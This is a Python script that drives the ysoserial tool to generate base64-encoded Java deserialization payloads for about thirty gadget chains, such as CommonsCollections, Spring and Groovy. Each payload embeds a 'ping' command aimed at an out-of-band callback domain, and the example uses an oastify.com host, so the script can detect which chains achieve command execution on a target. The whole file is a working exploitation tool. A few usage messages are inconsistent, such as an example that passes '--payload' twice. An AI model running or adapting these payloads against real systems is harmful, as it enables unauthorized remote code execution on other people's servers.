import subprocess
from re import search
import os
from base64 import b64encode

import argparse

def checkJavaVersion():
    print('[*] Checking Java version...')

    # Run command 'java --version'
    javaVersionOutput = subprocess.check_output(['java', '--version'])
    matchedResult = search(r'([0-9.]+)', str(javaVersionOutput))
    javaVersion = matchedResult.group(0)

    print(f'[*] Java version is: {javaVersion}')

    if int(javaVersion[:2]) >= 12:
        print('[-] This version doesn\'t work. Please switch to Java version <= 12. Example:')
        print('''export JAVA_HOME="/usr/lib/jvm/java-11-openjdk-amd64"''')
        exit(1)
    else:
        print('[+] This version works!')

parser = argparse.ArgumentParser()
parser.add_argument('-j', '--jar', dest='jarPath', default='./ysoserial-all.jar')
parser.add_argument('-m', '--mode', dest='mode', default='oob')
parser.add_argument('-d', '--domain', dest='domain')
parser.add_argument('-p', '--payload', dest='payload')
parser.add_argument('-o', '--output', dest='output', default='payloads.b64')
args = parser.parse_args()

# Check Java version, and exit if wrong
checkJavaVersion()

# List of all payloads
payloads = [
    "AspectJWeaver",
    "BeanShell1",
    "C3P0",
    "Click1",
    "Clojure",
    "CommonsBeanutils1",
    "CommonsCollections1",
    "CommonsCollections2",
    "CommonsCollections3",
    "CommonsCollections4",
    "CommonsCollections5",
    "CommonsCollections6",
    "CommonsCollections7",
    "FileUpload1",
    "Groovy1",
    "Hibernate1",
    "Hibernate2",
    "JBossInterceptors1",
    "JRMPClient",
    "JRMPListener",
    "JSON1",
    "JavassistWeld1",
    "Jdk7u21",
    "Jython1",
    "MozillaRhino1",
    "MozillaRhino2",
    "Myfaces1",
    "Myfaces2",
    "ROME",
    "Spring1",
    "Spring2",
    "URLDNS",
    "Vaadin1",
    "Wicket1"
]

def generatePayload(payload, command):
    print('[*] Generating payload...')
    print(f'[*] Payload = {payload}, command = {command}')

    # Run command 'java -jar <ysoserial jar full path> <payload> <command>', and base64 encode it
    try:
        generatedPayload = b64encode(subprocess.check_output(['java', '-jar', args.jarPath, payload, command]))
    except:
        generatedPayload = 'ERROR'

    # for character in generatedPayload:
    #     with open('ysoserial_payload.b64', 'a') as file:
    #         file.write(chr(character))

    with open(args.output, 'a') as f:
        f.write(payload + ':' + str(generatedPayload) + '\n\n')

    print(payload + ':' + str(generatedPayload))

def mode_oobs():
    if not args.domain:
        print('[-] With OOBS mode, a domain must be specified. Example:')
        print('[-] python3 ysoserial.py --mode oobs --domain pibyxv5bsfgyzjnl2digrwv58wen2fq4.oastify.com')
        exit(2)
    for payload in payloads:
        command = 'ping ' + payload + '.' + args.domain
        generatePayload(payload, command)

def mode_oob():
    if not args.domain:
        print('[-] With OOB mode, a domain must be specified. Example:')
        print('[-] python3 ysoserial.py --mode oob --domain pibyxv5bsfgyzjnl2digrwv58wen2fq4.oastify.com --payload CC1')
        exit(2)

    if not args.payload:
        print('[-] With OOB mode, a payload must be specified. Example:')
        print('[-] python3 ysoserial.py --mode oob --payload pibyxv5bsfgyzjnl2digrwv58wen2fq4.oastify.com --payload CC1')
        exit(3)

    command = 'ping ' + args.payload + '.' + args.domain
    generatePayload(args.payload, command)

# Evaluate mode
if args.mode == "oobs":
    mode_oobs()
elif args.mode == "oob":
    mode_oob()
else:
    pass
print('[*] Bye!')


